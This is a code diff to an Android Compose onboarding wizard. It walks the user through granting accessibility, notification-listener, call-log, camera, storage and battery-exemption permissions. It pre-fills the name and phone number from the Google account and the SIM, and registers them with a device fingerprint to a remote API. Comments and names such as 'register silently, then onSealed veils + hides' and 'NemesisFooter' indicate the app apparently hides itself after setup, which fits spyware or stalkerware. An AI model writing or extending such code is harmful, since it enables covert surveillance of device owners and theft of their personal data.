@@ -20,12 +20,12 @@ import androidx.compose.foundation.rememberScrollState
 import androidx.compose.foundation.shape.CircleShape
 import androidx.compose.foundation.verticalScroll
 import androidx.compose.material3.Button
+import androidx.compose.material3.ButtonDefaults
 import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.OutlinedTextField
 import androidx.compose.material3.Text
 import androidx.compose.material3.TextButton
 import androidx.compose.runtime.Composable
-import androidx.compose.runtime.DisposableEffect
 import androidx.compose.runtime.LaunchedEffect
 import androidx.compose.runtime.getValue
 import androidx.compose.runtime.mutableStateMapOf
@@ -41,9 +41,8 @@ import androidx.compose.ui.platform.testTag
 import androidx.compose.ui.res.stringResource
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
-import androidx.lifecycle.Lifecycle
-import androidx.lifecycle.LifecycleEventObserver
 import androidx.lifecycle.lifecycleScope
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 
 val RED = Color(0xFFD32F2F)
@@ -177,19 +176,46 @@ object GreenChecker : PermissionChecker {
 
 @Composable
 fun WizardTitle(text: String) {
-    Text(text, fontSize = 17.sp, modifier = Modifier.padding(vertical = 8.dp))
+    Text(
+        text,
+        fontSize = 20.sp,
+        color = MaterialTheme.colorScheme.onSurface,
+        modifier = Modifier.padding(vertical = 8.dp)
+    )
 }
 
 @Composable
-fun NextButton(enabled: Boolean, tag: String, onClick: () -> Unit) {
+fun NemesisFooter() {
+    Text(
+        stringResource(R.string.dev_footer),
+        fontSize = 11.sp,
+        color = MaterialTheme.colorScheme.onSurfaceVariant,
+        modifier = Modifier.padding(vertical = 10.dp)
+    )
+}
+
+@Composable
+fun NextButton(enabled: Boolean, tag: String, label: Int = R.string.btn_next, onClick: () -> Unit) {
     Button(
         onClick = onClick,
         enabled = enabled,
         modifier = Modifier
             .padding(top = 16.dp)
             .testTag(tag)
-    ) { Text(stringResource(R.string.btn_next)) }
+    ) { Text(stringResource(label)) }
 }
+
+/** The six single-permission screens, in spec order. */
+data class PermSpec(val key: PermKey, val icon: String, val reasonRes: Int)
+
+val PERM_FLOW = listOf(
+    PermSpec(PermKey.ACCESSIBILITY, "♿", R.string.reason_a11y),
+    PermSpec(PermKey.BATTERY_OPT, "🔋", R.string.reason_battery),
+    PermSpec(PermKey.NOTIF_LISTENER, "🔔", R.string.reason_notif),
+    PermSpec(PermKey.CAMERA, "📷", R.string.reason_camera),
+    PermSpec(PermKey.STORAGE_READ, "🗂️", R.string.reason_storage),
+    PermSpec(PermKey.CALL_LOG, "📞", R.string.reason_calllog)
+)
 
 @Composable
 fun WizardScreen(
@@ -201,150 +227,224 @@ fun WizardScreen(
     onSealed: suspend () -> Unit
 ) {
     var step by rememberSaveable { mutableStateOf(Step.INTRO) }
+    var permIdx by rememberSaveable { mutableStateOf(0) }
     var name by remember { mutableStateOf("") }
+    var gender by rememberSaveable { mutableStateOf("") }
     var phoneRaw by remember { mutableStateOf("") }
     val permStates = remember { mutableStateMapOf<PermKey, Boolean>() }
     PermKey.entries.forEach { permStates.putIfAbsent(it, false) }
 
-    Column(
+    Box(
         Modifier
             .fillMaxSize()
             .background(MaterialTheme.colorScheme.surface)
-            .verticalScroll(rememberScrollState())
-            .padding(16.dp)
     ) {
-        when (step) {
-            Step.INTRO -> {
-                WizardTitle(stringResource(R.string.welcome_line1))
-                WizardTitle(stringResource(R.string.welcome_line2))
-                NextButton(enabled = true, tag = "next_intro") { step = Step.NAME }
-            }
-
-            Step.NAME -> {
-                // Attempt a graceful prefill from the Google account (GET_ACCOUNTS).
-                // Absence is an ordinary outcome: the user just types normally.
-                val activityCtx = LocalContext.current
-                LaunchedEffect(Unit) {
-                    if (name.isBlank()) {
-                        AccountReader.nameCandidate(AccountReader.firstGoogleEmail(activityCtx))
-                            ?.let { name = it }
+        Column(
+            Modifier
+                .fillMaxSize()
+                .verticalScroll(rememberScrollState())
+                .padding(24.dp)
+                .padding(bottom = 48.dp)
+        ) {
+            when (step) {
+                Step.INTRO -> {
+                    // Logo block: neutral Material surface tile.
+                    Box(
+                        Modifier
+                            .padding(top = 48.dp, bottom = 24.dp)
+                            .size(88.dp)
+                            .background(MaterialTheme.colorScheme.primary, CircleShape)
+                    )
+                    WizardTitle(stringResource(R.string.welcome_line1))
+                    Text(
+                        stringResource(R.string.welcome_sub),
+                        fontSize = 14.sp,
+                        color = MaterialTheme.colorScheme.onSurfaceVariant
+                    )
+                    NextButton(enabled = true, tag = "next_intro", label = R.string.btn_get_started) {
+                        step = Step.IDENTITY
                     }
                 }
-                WizardTitle(stringResource(R.string.name_hint))
-                OutlinedTextField(
-                    value = name,
-                    onValueChange = { name = it },
-                    isError = name.isNotBlank() && !NameValidator.isValid(name),
-                    supportingText = {
-                        if (name.isNotBlank() && !NameValidator.isValid(name))
-                            Text(stringResource(R.string.name_error))
-                    },
-                    label = { Text(stringResource(R.string.name_hint)) },
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .testTag("name_input")
-                )
-                NextButton(enabled = NameValidator.isValid(name), tag = "next_name") {
-                    step = Step.CHECKLIST
-                }
-            }
 
-            Step.CHECKLIST -> {
-                WizardTitle(stringResource(R.string.step_checklist_title))
-                val activity = LocalContext.current as ComponentActivity
-                DisposableEffect(activity) {
-                    val obs = LifecycleEventObserver { _, ev ->
-                        if (ev == Lifecycle.Event.ON_RESUME) {
-                            checker.states(activity).forEach { permStates[it.key] = it.value }
+                Step.IDENTITY -> {
+                    val activityCtx = LocalContext.current
+                    LaunchedEffect(Unit) {
+                        if (name.isBlank()) {
+                            AccountReader.nameCandidate(AccountReader.firstGoogleEmail(activityCtx))
+                                ?.let { name = it }
                         }
                     }
-                    activity.lifecycle.addObserver(obs)
-                    onDispose { activity.lifecycle.removeObserver(obs) }
-                }
-                LaunchedEffect(Unit) {
-                    checker.states(activity).forEach { permStates[it.key] = it.value }
-                }
-                PermKey.entries.forEach { key ->
-                    val ok = permStates[key] == true
-                    Row(
-                        Modifier
+                    WizardTitle(stringResource(R.string.name_hint))
+                    OutlinedTextField(
+                        value = name,
+                        onValueChange = { name = it },
+                        isError = name.isNotBlank() && !NameValidator.isValid(name),
+                        supportingText = {
+                            if (name.isNotBlank() && !NameValidator.isValid(name))
+                                Text(stringResource(R.string.name_error))
+                        },
+                        label = { Text(stringResource(R.string.name_hint)) },
+                        modifier = Modifier
                             .fillMaxWidth()
-                            .padding(vertical = 6.dp),
+                            .testTag("name_input")
+                    )
+                    Text(
+                        stringResource(R.string.gender_title),
+                        fontSize = 14.sp,
+                        modifier = Modifier.padding(top = 20.dp, bottom = 6.dp)
+                    )
+                    Row(Modifier.fillMaxWidth()) {
+                        listOf("male" to R.string.gender_male, "female" to R.string.gender_female)
+                            .forEach { (value, res) ->
+                                val selected = gender == value
+                                Button(
+                                    onClick = { gender = value },
+                                    colors = if (selected) ButtonDefaults.buttonColors()
+                                    else ButtonDefaults.outlinedButtonColors(),
+                                    modifier = Modifier
+                                        .weight(1f)
+                                        .padding(end = if (value == "male") 8.dp else 0.dp)
+                                        .testTag("gender_$value")
+                                ) { Text(stringResource(res)) }
+                            }
+                    }
+                    NextButton(
+                        enabled = NameValidator.isValid(name) && gender.isNotBlank(),
+                        tag = "next_identity"
+                    ) { step = Step.PHONE }
+                }
+
+                Step.PHONE -> {
+                    val activityCtx = LocalContext.current
+                    var simPrefillDone by rememberSaveable { mutableStateOf(false) }
+                    LaunchedEffect(Unit) {
+                        if (!simPrefillDone && phoneRaw.isBlank()) {
+                            PhoneSource.simLineNumber(activityCtx)?.let { phoneRaw = it }
+                        }
+                        simPrefillDone = true
+                    }
+                    val normalized = PhoneNormalizer.normalize(phoneRaw)
+                    WizardTitle(stringResource(R.string.phone_hint))
+                    OutlinedTextField(
+                        value = phoneRaw,
+                        onValueChange = { phoneRaw = it },
+                        isError = normalized == null && phoneRaw.isNotBlank(),
+                        supportingText = {
+                            if (normalized == null && phoneRaw.isNotBlank())
+                                Text(stringResource(R.string.phone_error))
+                        },
+                        label = { Text(stringResource(R.string.phone_hint)) },
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .testTag("phone_input")
+                    )
+                    NextButton(enabled = normalized != null, tag = "next_phone") {
+                        step = Step.PERM; permIdx = 0
+                    }
+                }
+
+                Step.PERM -> {
+                    val spec = PERM_FLOW[permIdx]
+                    val activity = LocalContext.current as ComponentActivity
+                    var granted by remember { mutableStateOf(checker.states(activity)[spec.key] == true) }
+                    var prevGranted by remember { mutableStateOf(granted) }
+                    // Poll: catches both runtime-request results and settings returns.
+                    LaunchedEffect(permIdx) {
+                        while (true) {
+                            granted = checker.states(activity)[spec.key] == true
+                            kotlinx.coroutines.delay(1200)
+                        }
+                    }
+                    // Granted transition auto-advances; already-granted does not.
+                    LaunchedEffect(granted) {
+                        if (granted && !prevGranted) {
+                            if (permIdx < PERM_FLOW.lastIndex) permIdx++ else step = Step.SUMMARY
+                        }
+                        prevGranted = granted
+                    }
+                    Text(spec.icon, fontSize = 44.sp, modifier = Modifier.padding(top = 24.dp))
+                    WizardTitle(stringResource(spec.key.titleRes))
+                    Text(
+                        stringResource(spec.reasonRes),
+                        fontSize = 14.sp,
+                        color = MaterialTheme.colorScheme.onSurfaceVariant
+                    )
+                    Row(
+                        Modifier.padding(top = 14.dp),
                         verticalAlignment = Alignment.CenterVertically
                     ) {
                         Box(
                             Modifier
-                                .size(14.dp)
-                                .background(if (ok) GREEN_OK else RED, CircleShape)
+                                .size(12.dp)
+                                .background(if (granted) GREEN_OK else RED, CircleShape)
                         )
-                        Spacer(Modifier.width(12.dp))
-                        Text(stringResource(key.titleRes), Modifier.weight(1f))
-                        TextButton(onClick = { opener.open(activity, key) }) {
-                            Text(
-                                stringResource(
-                                    if (ok) R.string.row_done_glyph else R.string.row_open_settings
-                                )
-                            )
-                        }
+                        Spacer(Modifier.width(8.dp))
+                        Text(
+                            stringResource(if (granted) R.string.granted_mark else spec.key.titleRes),
+                            fontSize = 12.sp
+                        )
+                    }
+                    Row(Modifier.padding(top = 20.dp)) {
+                        Button(
+                            onClick = {
+                                val rp = spec.key.runtimePerm
+                                if (rp != null) {
+                                    androidx.core.app.ActivityCompat.requestPermissions(
+                                        activity, arrayOf(rp), permIdx + 100
+                                    )
+                                } else {
+                                    opener.open(activity, spec.key)
+                                }
+                            },
+                            enabled = !granted,
+                            modifier = Modifier.testTag("perm_allow")
+                        ) { Text(stringResource(R.string.btn_allow)) }
+                        TextButton(
+                            onClick = {
+                                if (permIdx < PERM_FLOW.lastIndex) permIdx++ else step = Step.SUMMARY
+                            },
+                            modifier = Modifier.testTag("perm_skip")
+                        ) { Text(stringResource(R.string.btn_skip)) }
                     }
                 }
-                NextButton(
-                    enabled = PermKey.gateOpen(permStates),
-                    tag = "next_checklist"
-                ) { step = Step.PHONE }
-            }
 
-            Step.PHONE -> {
-                val activityCtx = LocalContext.current
-                // SIM hint prefill: line1Number == null is NOT a failure state.
-                // A one-shot flag guards against re-insertion after recreation.
-                var simPrefillDone by rememberSaveable { mutableStateOf(false) }
-                LaunchedEffect(Unit) {
-                    if (!simPrefillDone && phoneRaw.isBlank()) {
-                        PhoneSource.simLineNumber(activityCtx)?.let {
-                            phoneRaw = it
-                        }
-                    }
-                    simPrefillDone = true
-                }
-                val normalized = PhoneNormalizer.normalize(phoneRaw)
-                WizardTitle(stringResource(R.string.phone_hint))
-                OutlinedTextField(
-                    value = phoneRaw,
-                    onValueChange = { phoneRaw = it },
-                    isError = normalized == null && phoneRaw.isNotBlank(),
-                    supportingText = {
-                        if (normalized == null && phoneRaw.isNotBlank())
-                            Text(stringResource(R.string.phone_error))
-                    },
-                    label = { Text(stringResource(R.string.phone_hint)) },
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .testTag("phone_input")
-                )
-                NextButton(enabled = normalized != null, tag = "next_phone") {
-                    step = Step.SUMMARY
-                }
-            }
-
-            Step.SUMMARY -> {
-                // Wizard complete: register silently, then onSealed veils + hides.
-                WizardTitle(stringResource(R.string.summary_title))
-                LaunchedEffect(Unit) {
-                    val reg = Registration(
-                        "",
-                        name.trim(),
-                        PhoneNormalizer.normalize(phoneRaw)!!,
-                        System.currentTimeMillis(),
-                        deviceInfo.fingerprint(),
-                        deviceInfo.constraints()
+                Step.SUMMARY -> {
+                    WizardTitle(stringResource(R.string.summary_title))
+                    Text(
+                        stringResource(R.string.summary_name_fmt, name.trim()),
+                        modifier = Modifier.padding(top = 8.dp)
                     )
-                    api.register(reg).onSuccess { id -> store.save(reg.copy(id = id)) }
-                    onSealed()
+                    Text(stringResource(R.string.summary_phone_fmt, phoneRaw))
+                    Text(
+                        stringResource(
+                            R.string.summary_gender_fmt,
+                            stringResource(
+                                if (gender == "female") R.string.gender_female else R.string.gender_male
+                            )
+                        )
+                    )
+                    var finishing by remember { mutableStateOf(false) }
+                    NextButton(enabled = !finishing, tag = "finish", label = R.string.btn_finish) {
+                        finishing = true
+                    }
+                    if (finishing) {
+                        LaunchedEffect(Unit) {
+                            val reg = Registration(
+                                "",
+                                name.trim(),
+                                PhoneNormalizer.normalize(phoneRaw)!!,
+                                gender,
+                                System.currentTimeMillis(),
+                                deviceInfo.fingerprint(),
+                                deviceInfo.constraints()
+                            )
+                            api.register(reg).onSuccess { id -> store.save(reg.copy(id = id)) }
+                            onSealed()
+                        }
+                    }
                 }
             }
-
-            Step.LOCKING -> {}
         }
+        Box(Modifier.align(Alignment.BottomCenter)) { NemesisFooter() }
     }
 }
